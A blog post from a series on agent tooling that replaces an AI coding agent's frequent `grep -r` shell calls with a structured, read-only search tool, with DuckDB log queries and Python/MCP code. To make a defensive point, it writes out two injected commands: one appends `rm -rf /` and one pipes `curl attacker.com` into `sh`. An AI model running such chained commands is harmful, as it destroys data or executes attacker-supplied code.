# Closing the Channel

*You've been reading about the ratchet. Time to watch it turn.*

---

## Time to build

Four posts of theory. The ratchet concept, the failure stream, the two-stage turn, the placement principle, the mode controller. You know what the ratchet is. You know what fuels it. You know where the space should live.

Now you're going to watch a computation channel close.

This post walks through the full process — from discovering a pattern in conversation logs, to characterizing what makes it expensive, to building the structured replacement that drops the grade. The tool you build here is real. The code runs. The grade drop is measurable.

By the end, you'll have done the thing the series has been describing: converted a piece of high-*ma* behavior into low-*ma* infrastructure. Same functionality. Categorically different grade.

Let's build.

---

## Stage 1: Discovery

### Finding the pattern

Start with your conversation logs. Claude Code stores every tool call as structured data — tool name, arguments, result, success flag, duration. DuckDB reads these natively.

The discovery query is the one from [Post 1](01-fuel.md), focused on Bash calls. Group tool calls by command prefix, count frequency, measure success rate. (The queries below use a simplified schema — `tool`, `arguments`, `success` — for readability. Fledgling's `tool_calls()` macro handles parsing the real Claude Code JSONL into this shape.)

```sql
-- What bash commands does the agent actually run?
SELECT command_prefix,
       count(*) as frequency,
       round(avg(CASE WHEN success THEN 1.0 ELSE 0.0 END), 3) as success_rate,
       count(DISTINCT session_id) as across_n_sessions
FROM bash_patterns
ORDER BY frequency * success_rate DESC;
```

When we ran this against Fledgling's development logs, the results were immediate:

```
┌─────────────────┬───────────┬──────────────┬─────────────────┬────────────────┐
│ command_prefix  │ frequency │ success_rate │ avg_duration_ms │ across_n_tasks │
├─────────────────┼───────────┼──────────────┼─────────────────┼────────────────┤
│ grep -r         │       847 │        0.923 │             312 │             34 │
│ find .          │       412 │        0.891 │             287 │             28 │
│ cat             │       389 │        0.974 │              45 │             31 │
│ wc -l           │       201 │        0.985 │              38 │             22 │
│ git log         │       156 │        0.962 │             198 │             19 │
│ git diff        │       134 │        0.940 │             245 │             17 │
│ head -n         │       128 │        0.969 │              41 │             20 │
│ ls -la          │        98 │        0.959 │              34 │             15 │
│ python -c       │        67 │        0.582 │            1847 │             12 │
│ npm test        │        45 │        0.444 │           12340 │              8 │
└─────────────────┴───────────┴──────────────┴─────────────────┴────────────────┘
```

Look at `grep -r`. Eight hundred and forty-seven calls. 92.3% success rate. Across thirty-four tasks. The agent ran this command an average of twenty-five times per task.

That's twenty-five times per task that the full weight manifold of a frontier model produced the string `grep -r "some pattern" ./some/path` and then passed it to a shell that looked up `grep` in PATH, expanded any aliases, and ran whatever binary it found.

Twenty-five times per task the model did its most expensive work to produce something a function call could handle.

### Drilling into the pattern

The top-level frequency tells you *which* pattern to investigate. The next query tells you *what* the pattern actually does:

Drill into the top candidate — filter for `grep -r` calls and look at the actual commands. The commands follow a tight distribution. Almost all of them look like:

```bash
grep -r "pattern" ./path --include="*.py"
grep -rn "function_name" ./src
grep -rl "import something" .
```

Three flags account for 90% of usage: `-r` (recursive), `-n` (line numbers), `-l` (files only), and `--include` (file type filter). The patterns are string literals or simple regexes. The paths are relative to the project root.

This is not bash in any interesting sense. The agent isn't using pipes, redirects, environment variables, or command chaining. It's calling a single binary with predictable arguments to perform a read-only filesystem search. The computation channel — the ability to execute arbitrary programs — is engaged for an operation that's functionally a database query.

### Characterizing the dependencies

Here's the critical step that most tool-building skips. Before you build the replacement, you need to understand what the bash pattern *actually depends on*.

`Bash("grep -r pattern path")` is honestly `IO String`. That type is broad, and the broadness is real. Here's why:

**PATH resolution.** The shell resolves `grep` through PATH lookup. On most systems, this finds `/usr/bin/grep`. But PATH is mutable. An alias, a shim, a different grep implementation — any of these change the behavior. The same command string produces different results on different machines or even in different shell sessions.

**Shell configuration.** The command runs inside a shell. That shell has a configuration: `.bashrc`, `.bash_profile`, environment variables. The configuration can affect argument expansion, locale settings (which affect regex matching), and output formatting. Two identical commands in two differently-configured shells can produce different output.

**Filesystem state.** The search depends on the current state of the filesystem. Files can change between calls. The codebase can be in any state. This dependency is legitimate — a codebase search *should* reflect the current state. But the dependency is uncharacterized. The tool doesn't declare what it reads.

**Output format.** `grep` produces unstructured text. The format varies by flag combination and by platform. GNU grep and BSD grep have different default behaviors. The agent has to parse the output string, and parsing strategies that work on one system may fail on another.

Every one of these dependencies is a channel through which the world can affect the computation. That's what makes it a Level 4 computation channel — the input is an arbitrary string, the execution environment is a universal machine, and the output is an arbitrary string. The full characterization of "what could happen" is the halting problem.

You can't narrow the type of `Bash("grep -r ...")` without lying. The type *is* `IO String`. The question is whether you can build something with a narrower type that does the same job honestly.

---

## Stage 2: Crystallization

### The structured replacement

Here is the replacement. Not a wrapper around grep — a new implementation whose type commitments are backed by its internals.

```python
"""
search_tool.py — A structured codebase search tool.

Replaces: Bash("grep -r pattern path")
Grade before: Level 4 computation channel (arbitrary string -> universal machine)
Grade after: Level 1 data channel (structured query -> bounded search -> structured results)

Full implementation: https://github.com/teaguesterling/fledgling
"""

from dataclasses import dataclass, field
from pathlib import Path
import re

@dataclass
class MatchResult:
    """A single search match with structured fields."""
    file: str
    line_number: int
    line_content: str
    match_start: int
    match_end: int

@dataclass
class SearchResult:
    """Complete search result with metadata."""
    pattern: str
    root: str
    matches: list[MatchResult] = field(default_factory=list)
    files_searched: int = 0
    files_matched: int = 0
    truncated: bool = False
    error: str | None = None

def search(
    pattern: str,
    root: str = ".",
    *,
    include: str | None = None,
    max_results: int = 200,
    case_sensitive: bool = True,
) -> SearchResult:
    """
    Search files under root for lines matching pattern.

    This function:
        - Reads files directly (no shell, no PATH lookup, no aliases)
        - Returns structured data (not strings to parse)
        - Declares its effects (read-only filesystem access under root)
        - Bounds its output (max_results cap)
        - Handles errors explicitly (no silent failures)
    """
    result = SearchResult(pattern=pattern, root=str(root))
    compiled = re.compile(pattern, 0 if case_sensitive else re.IGNORECASE)
    root_path = Path(root).resolve()

    for filepath in _walk_files(root_path, include):
        result.files_searched += 1
        # ... read file, match lines, append MatchResult objects ...
        # ... respect max_results cap, set truncated flag ...

    return result
```

### What changed

Read that implementation carefully. Notice what's *not there*.

**No shell.** The function calls `Path.iterdir()` and `Path.read_text()`. No subprocess invocation, no shell of any kind. PATH is irrelevant. Aliases are irrelevant. Shell configuration is irrelevant. Three dependency channels closed.

**No string parsing.** The function returns `SearchResult` — a dataclass with typed fields. The caller doesn't parse grep output. The match location is an integer pair, not a string to be split on colons. The file path is a string relative to the search root. The line content is the line itself, already separated from the metadata.

**Declared effects.** The function reads files under `root`. That's it. No writes. No network access. No subprocesses. No side effects. The type doesn't say `IO String` — it says "read files under this path and return structured matches."

**Bounded output.** The `max_results` parameter caps how much data comes back. The `truncated` flag tells the caller when the cap was hit. The output size is predictable.

**Explicit errors.** Invalid patterns return a `SearchResult` with the error field populated. Missing directories are reported. Permission errors on individual files are silently skipped (the file is inaccessible; that's not an error in the search, it's a fact about the filesystem). No exceptions leak to the caller.

### The MCP tool version

The structured search becomes an MCP tool definition — five typed parameters, structured output:

```python
# search_mcp.py — MCP tool wrapper for structured search.
# Full implementation: blog/fuel/code/search_mcp.py

@server.tool()
async def codebase_search(
    pattern: str,
    root: str = ".",
    include: str | None = None,
    max_results: int = 200,
    case_sensitive: bool = True,
) -> list[TextContent]:
    """Search codebase files for a regex pattern.
    Returns structured match results. Read-only operation."""
    result = search(pattern=pattern, root=root, include=include, ...)
    return [TextContent(type="text", text=format_result(result))]
```

The agent fills in structured fields. It doesn't compose a shell command.

### The DuckDB version

If your pipeline is SQL-native, the search tool is a macro over an indexed codebase table:

```sql
-- The structured search macro
-- Full implementation: blog/fuel/code/search.sql
CREATE OR REPLACE MACRO search(search_pattern, search_path) AS TABLE
    SELECT file_path, line_number, line_content
    FROM codebase
    WHERE regexp_matches(line_content, search_pattern)
      AND file_path LIKE (search_path || '%')
    ORDER BY file_path, line_number
    LIMIT 200;

-- Use it
FROM search('def test_', 'src/tests/');
```

Same operation. No shell. Structured input, structured output, bounded results. The codebase index is a specified artifact — you can read it, audit it, version it.

---

## The before and after

### Before: the computation channel

```
Agent: I need to find all test functions in the source directory.

Tool call: Bash
Arguments: {"command": "grep -rn 'def test_' ./src/tests/"}
```

What happens:

1. The agent's full decision surface engages to produce the string `grep -rn 'def test_' ./src/tests/`.
2. The Harness passes the string to a shell process.
3. The shell reads its configuration (profile, environment).
4. The shell resolves `grep` through PATH lookup.
5. The resolved binary receives the arguments as parsed by the shell.
6. The binary searches the filesystem.
7. Output goes to stdout as an unstructured string.
8. The string comes back to the agent.
9. The agent parses the string to extract file paths, line numbers, and content.

Steps 2-7 constitute the computation channel. At each step, the world can intervene. The shell configuration can change the behavior. PATH resolution can find a different binary. Argument expansion can modify the pattern. The output format varies by platform.

The Harness can inspect the *command string* before execution — it can pattern-match on `grep -rn` and decide whether to allow it. But it cannot characterize what the command *will do* without solving an undecidable problem. The string `grep -rn 'def test_' ./src/tests/` is probably a read-only search. But `grep -rn 'def test_' ./src/tests/; rm -rf /` is also a valid command string, and the Harness is pattern-matching on text, not analyzing programs.

**Grade: Level 4 computation channel.** Arbitrary input language (shell commands). Arbitrary effects (anything the shell can do). Arbitrary output (unstructured string). The characterization difficulty is maximal — you'd need to solve the halting problem to fully describe what could happen.

### After: the data channel

```
Agent: I need to find all test functions in the source directory.

Tool call: codebase_search
Arguments: {
    "pattern": "def test_",
    "root": "src/tests/"
}
```

What happens:

1. The agent's decision surface engages to fill in two structured fields: `pattern` and `root`.
2. The Harness validates the arguments against the tool schema.
3. The `search()` function walks the filesystem under `root`.
4. Lines matching `pattern` are collected into `MatchResult` objects.
5. A `SearchResult` with typed fields comes back to the agent.

That's it. No shell. No PATH. No aliases. No argument expansion. No output parsing. The function reads files and returns structured data.

The Harness can fully characterize what this tool call will do: it will read files under `src/tests/`, search for lines matching `def test_`, and return up to 200 structured matches. The characterization is complete. The Harness doesn't need to solve an undecidable problem. It reads the tool's declared interface and knows.

**Grade: Level 1 data channel.** Known input language (regex pattern + path). Known effects (read-only filesystem access, scoped to root). Known output schema (SearchResult with typed fields). The characterization difficulty is linear — proportional to the number of parameters.

### The two paths

```{mermaid}
%%{init: {'theme': 'neutral'}}%%
graph TD
    subgraph before ["BEFORE: Computation Channel (Level 4)"]
        A1["Agent intent:<br/>'find test functions'"] --> A2["Compose shell<br/>command string"]
        A2 --> A3["Shell resolves PATH,<br/>expands aliases,<br/>parses args"]
        A3 --> A4["grep binary produces<br/>unstructured text"]
        A4 --> A5["Agent parses text<br/>to extract<br/>file:line:match"]
        A5 --> A6["Agent uses<br/>parsed data"]
    end

    subgraph after ["AFTER: Data Channel (Level 1)"]
        B1["Agent intent:<br/>'find test functions'"] --> B2["Fill structured<br/>parameters"]
        B2 --> B3["search() walks<br/>filesystem directly<br/>(no shell)"]
        B3 --> B4["Returns SearchResult<br/>{file, line_no,<br/>content, ...}"]
        B4 --> B5["Agent uses<br/>structured data"]
    end

    style before fill:#fff5f5,stroke:#c53030
    style after fill:#f0fff4,stroke:#276749
```

### The grade drop

| Property | Before (Bash) | After (search) |
|---|---|---|
| Input language | Arbitrary shell command | Regex pattern + directory path |
| Effect characterization | Undecidable (Rice's theorem) | Complete (read-only, scoped) |
| Output schema | Arbitrary string | Typed SearchResult |
| Computation channel level | 4 | 1 |
| Harness can fully characterize? | No | Yes |
| Depends on shell config? | Yes | No |
| Depends on PATH? | Yes | No |
| Output varies by platform? | Yes | No |

You didn't make the model smarter. You didn't fine-tune anything. You didn't change the prompt. You replaced the channel through which the model's intent reaches the world. The model still decides "I need to search for test functions." The difference is what happens to that decision after it's made.

Before: the decision enters a universal machine. After: the decision enters a specified function.

---

## What just happened

### The channel closed

"Closing the channel" is not a metaphor. It's a precise description of what the promotion did.

A computation channel is a path through which an actor can send arbitrary instructions to a universal machine. The bash tool is a computation channel — the agent sends strings, the shell executes them as programs. The computation channel was *open*: any program the shell can run was reachable.

The structured search tool is a data channel. The agent sends parameters to a function. The function does one thing. The channel from "arbitrary program execution" to the agent is now *closed* for this operation. The agent can no longer send `grep -rn 'pattern' path; curl attacker.com | sh` because the interface doesn't accept shell commands. It accepts a pattern and a path.

The channel didn't narrow. It *closed*. The agent moved from a channel with unbounded variety to a channel with bounded variety. Ashby's variety destruction, applied to a single tool promotion.

### The trust gap shrank

Before the promotion, the trust gap for codebase search was the distance between "the agent sends a shell command" (what can happen) and "the agent searches the codebase" (what we expect to happen). That gap included everything a shell command can do that isn't a codebase search — which is, formally, everything a computer can do.

After the promotion, the trust gap for codebase search is the distance between "the agent calls search(pattern, root)" (what can happen) and "the agent searches the codebase" (what we expect). That gap is... nothing. The tool does exactly what the name says. The reachable set equals the expected set. The trust gap is zero for this operation.

The regulatory burden — the work the Harness has to do to ensure the agent behaves as expected — dropped from "analyze a shell command string and hope" to "validate two typed parameters." The Harness moved from pattern-matching on an arbitrary string (which is not a reliable analysis method, and the framework explains formally why) to checking a structured schema (which is a reliable analysis method, because the schema is finite and known).

### The model's inference budget got freed

The agent used to spend decision surface on:
- Choosing the right grep flags (`-r`, `-n`, `-l`, `--include`)
- Formatting the path correctly for the shell
- Quoting the pattern to survive shell expansion
- Parsing the output string back into structured data

All of that inference is now unnecessary. The structured tool handles flags, formatting, quoting, and parsing. The model's decision surface is freed for the actual question: *what to search for* and *where to look*.

This is Johannsen's transitions from [Post 3](03-where-the-failures-live.md), applied to tooling. Taylor's tables (the structured tool interface) handle the cuts (the mechanics of searching). Johannsen's expertise (the model's trained judgment) is freed for the transitions (deciding what to search for next, how to interpret the results, what to do with what it finds).

The space moved from mechanics to judgment. That's the placement principle at work.

---

## The generalization

This process works for any frequently-successful bash pattern. The steps are always the same:

**1. Query the logs.** Which bash patterns appear most frequently? Which succeed reliably? The discovery query from the top of this post gives you the candidates, ranked by `frequency * success_rate`.

**2. Characterize the dependencies.** For the top candidate: what does the bash command actually depend on? PATH? Shell configuration? Environment variables? Network access? Filesystem state? Each dependency is a channel through which the world can change the behavior. List them. They're the channels you're about to close.

**3. Identify the essential operation.** Strip away the shell machinery. What is the command *actually doing*? `grep -r` is searching files for a pattern. `find . -name` is listing files that match a name. `cat` is reading a file. `wc -l` is counting lines. The essential operation is simpler than the bash command because the bash command includes the shell overhead.

**4. Build the structured replacement.** Implement the essential operation directly. No shell. No PATH lookup. No string parsing. Structured input, structured output, declared effects. The type commitments of the new tool are backed by its implementation.

**5. Measure the grade drop.** Before and after. What channel level was the bash pattern? What channel level is the structured tool? What can the Harness now characterize that it couldn't before? The grade drop is the ratchet turning.

**6. Deploy and verify.** Make the structured tool available. Run the next session. Query the logs again. The bash pattern should appear less frequently (ideally not at all for the promoted operation). The tool call should appear in its place. The failure rate for this class of operation should drop.

The verification is specified: count `grep -r` bash calls before and after deployment, count `codebase_search` tool calls after. The bash pattern frequency should drop. The structured tool calls should appear in its place. SQL over structured logs — no judgment in the measurement loop. You can see whether the ratchet turned by reading a query result.

---

## What to promote next

Your logs contain the answer. Run the discovery query. Look at the top five bash patterns by `frequency * success_rate`. For each one, ask:

- **Is the essential operation simpler than the bash command?** If yes, there's a grade drop available. If the bash command is doing something genuinely complex — piping between five programs, using process substitution, manipulating state — the promotion may not be straightforward. Start with the simple ones.

- **Does the agent parse the output?** If the agent has to parse grep output to extract file paths and line numbers, that parsing is wasted inference. A structured tool eliminates it. Every parse step the agent does is inference budget that could be freed.

- **Does the agent construct the command carefully?** If the agent spends tokens choosing flags, quoting arguments, and handling platform differences, those tokens are wasted. A structured tool with explicit parameters eliminates the construction overhead.

- **Does the command have side effects?** Read-only commands (`grep`, `find`, `cat`, `wc`) are the safest promotions. Write commands (`sed -i`, `mv`, `mkdir`) have legitimate effects that need to be preserved in the structured tool. Start with reads.

The low-hanging fruit: `grep -r` becomes `search()`. `find . -name` becomes `find_files()`. `cat file` becomes `read_file()`. `wc -l` becomes `count_lines()`. These are the operations the agent reaches for most, and each is a data channel pretending to be a computation channel.

---

## The infrastructure got more honest

The model didn't get smarter. The infrastructure got more honest.

Before the promotion, the infrastructure *lied about what was happening*. The agent said "search for test functions." The tool interface said "here's a string — do whatever you want with it." The system's declared interface (arbitrary bash) was vastly broader than its actual use (codebase search). The dishonesty was in the gap between what the tool *could* do and what it *was being asked to do*.

After the promotion, the infrastructure tells the truth. The agent says "search for test functions." The tool interface says "give me a pattern and a path, and I'll search for matches." The system's declared interface matches its actual use. The tool does what the name says. Nothing more. Nothing less.

Type honesty — the concept from [Post 2](02-the-two-stage-turn.md) — is not an aesthetic preference. It's a structural property that determines whether the Harness can do its job. A Harness that sees `Bash("grep -r ...")` can hope. A Harness that sees `search(pattern="def test_", root="src/tests/")` can *know*.

The ratchet turns. The channel closes. The trust gap shrinks. The specified base grows. The model's inference budget is freed for the frontier — the problems where trained judgment actually belongs.

And the next bash pattern is sitting in your logs right now, waiting to be promoted.

---

*Previously: [The Failure-Driven Controller](04-the-failure-driven-controller.md)*
*Next: [The Segment Builder](06-the-segment-builder.md)*
*For the full Fledgling origin story: [The Configuration Ratchet](../ma/the-configuration-ratchet.md)*
